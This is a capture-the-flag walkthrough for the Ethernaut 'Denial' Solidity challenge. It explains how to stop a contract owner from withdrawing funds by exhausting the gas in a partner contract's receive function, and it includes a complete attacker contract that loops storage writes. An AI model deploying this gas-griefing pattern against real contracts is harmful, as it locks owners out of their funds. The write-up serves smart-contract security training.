# Denial Ethernaut

## Goals

=> If you can deny the owner from withdrawing funds when they call `withdraw()` (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.

### Hints

- None

### Solution

- They requirements can be met by just creating a few computational expensive actions in the receive function of the "partner" contract like a few storage writes at 20k gas each so we would need about 50 storage writes to exceed 1M gas.

- Just deploy the below contract to win the challenge

### Contract

```solidity
contract Hack {
    Denial denial;

    address[] grieverArray;

    constructor(address _denial) {
        denial = Denial(payable(_denial));
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // sufficient for close to 2 million gas (1 million was the goal)
        for (uint i = 0; i < 100; ++i) {
            grieverArray.push(msg.sender);
        }
    }
}
```
